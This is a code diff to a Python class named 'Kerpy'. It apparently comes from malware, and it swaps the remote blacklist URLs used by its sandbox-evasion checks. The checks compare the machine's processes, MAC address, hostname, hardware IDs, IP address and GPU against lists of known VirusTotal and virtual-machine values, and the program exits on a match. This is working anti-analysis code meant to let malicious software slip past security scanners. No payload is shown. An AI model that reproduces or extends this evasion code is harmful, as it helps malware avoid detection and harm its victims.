@@ -107,44 +107,44 @@ class Kerpy:
         except:
             pass        
         
-        processl = requests.get("https://raw.githubusercontent.com/Lawxsz/bypass-virus-total/main/utils/process.txt").text
+        processl = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/process.txt").text
         if processl in processList:
             sys.exit()
             
     def mac_check(self):
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        mac_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt").text
+        mac_list = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/mac_list.txt").text
         if mac_address[:8] in mac_list:
             print("VMware MAC Address Detected")
             sys.exit()
     def check_pc(self):
      vmname = os.getlogin()
-     vm_name = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt").text
+     vm_name = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/pc_name_list.txt").text
      if vmname in vm_name:
          sys.exit()
-     vmusername = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt").text
+     vmusername = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/pc_username_list.txt").text
      host_name = socket.gethostname()
      if host_name in vmusername:
          sys.exit()
     def hwid_vm(self):
      current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
-     hwid_vm = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt").text
+     hwid_vm = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/hwid_list.txt").text
      if current_machine_id in hwid_vm:
          sys.exit()
  
 
     def check_ip(self):
-     ip_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt").text
+     ip_list = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/ip_list.txt").text
      reqip = requests.get("https://api.ipify.org/?format=json").json()
      ip = reqip["ip"]
      if ip in ip_list:
          sys.exit()
     def profiles():
      machine_guid = uuid.getnode()
-     guid_pc = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt").text
-     bios_guid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt").text
-     baseboard_guid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt").text
-     serial_disk = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt").text
+     guid_pc = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/MachineGuid.txt").text
+     bios_guid = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/BIOS_Serial_List.txt").text
+     baseboard_guid = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/BaseBoard_Serial_List.txt").text
+     serial_disk = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/DiskDrive_Serial_List.txt").text
      if machine_guid in guid_pc:
          sys.exit()
 
@@ -152,7 +152,7 @@ def checkgpu():
     ctypes.windll.user32.EnumDisplayDevicesW(None, 0, ctypes.byref(ctypes.create_string_buffer(32)), 0)
     GPUm = ctypes.create_unicode_buffer(32)
     ctypes.windll.user32.EnumDisplayDevicesW(None, 0, ctypes.byref(GPUm), 0)
-    gpulist = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt").text
+    gpulist = requests.get("https://raw.githubusercontent.com/Ayhuuu/vt/main/gpu_list.txt").text
     if GPUm.value.strip() in gpulist:
         sys.exit()
 
